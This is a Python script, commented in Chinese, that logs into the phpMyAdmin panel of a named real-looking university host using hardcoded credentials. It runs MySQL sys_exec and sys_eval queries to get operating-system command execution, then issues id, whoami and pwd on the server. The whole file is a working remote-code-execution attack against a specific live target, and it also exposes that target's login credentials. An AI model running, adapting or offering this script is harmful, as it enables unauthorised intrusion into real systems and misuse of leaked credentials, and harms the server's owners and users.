#!/usr/bin/env python3
import requests
import re
import urllib3
import html
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

print(f"[+] Token: {token}")

# 验证sys_exec是否可执行
test_cmd = "echo 'TEST123456'"
sql = f"SELECT sys_exec('{test_cmd}');"
sql_data = {"sql_query": sql, "db": "mysql"}
resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

# 保存完整响应
with open("/tmp/sys_exec_resp.html", "w", encoding="utf-8", errors="ignore") as f:
    f.write(resp.text)

# 解析响应查找输出
content = resp.text
print(f"[*] 响应长度: {len(content)}")

# 查找所有可能的输出位置
patterns = [
    (r'<td[^>]*>(.*?)</td>', "TD标签"),
    (r'<pre[^>]*>(.*?)</pre>', "PRE标签"),
    (r'<div[^>]*>(.*?)</div>', "DIV标签"),
    (r'TEST123456', "命令输出"),
    (r'0|1|2|3|4|5|6|7|8|9', "返回码"),
]

found = False
for pattern, desc in patterns:
    matches = re.findall(pattern, content, re.DOTALL | re.IGNORECASE)
    for match in matches:
        if isinstance(match, tuple):
            match = match[0]
        clean = re.sub(r'<[^>]+>', '', str(match)).strip()
        clean = html.unescape(clean)
        if clean and len(clean) > 0:
            if "TEST123456" in clean:
                print(f"[+] 找到命令输出 ({desc}): {clean[:200]}")
                found = True
            elif desc == "返回码" and clean.isdigit():
                print(f"[*] 可能的返回码: {clean}")

# 尝试sys_eval
print("\n[*] 尝试sys_eval...")
sql = f"SELECT sys_eval('{test_cmd}');"
sql_data = {"sql_query": sql, "db": "mysql"}
resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

content = resp.text
if "TEST123456" in content:
    print("[+] sys_eval可以执行并返回输出!")
    # 提取输出
    tds = re.findall(r'<td[^>]*>(.*?)</td>', content, re.DOTALL)
    for td in tds:
        clean = re.sub(r'<[^>]+>', '', td).strip()
        clean = html.unescape(clean)
        if "TEST123456" in clean:
            print(f"[+] 输出: {clean}")
            found = True

if not found:
    print("[-] 未找到命令输出，可能:")
    print("    1. sys_exec/sys_eval没有执行权限")
    print("    2. 输出被过滤或隐藏")
    print("    3. 函数不存在或已禁用")

# 尝试执行实际命令
if found:
    print("\n[+] 验证成功，执行实际命令...")
    commands = [
        ("id", "查看用户信息"),
        ("whoami", "查看当前用户"),
        ("pwd", "查看当前目录"),
    ]
    
    for cmd, desc in commands:
        print(f"\n[*] {desc}: {cmd}")
        sql = f"SELECT sys_eval('{cmd}');"
        sql_data = {"sql_query": sql, "db": "mysql"}
        resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
        
        content = resp.text
        tds = re.findall(r'<td[^>]*>(.*?)</td>', content, re.DOTALL)
        for td in tds:
            clean = re.sub(r'<[^>]+>', '', td).strip()
            clean = html.unescape(clean)
            if clean and len(clean) > 3 and not clean.startswith("<"):
                print(f"[+] 输出: {clean[:500]}")
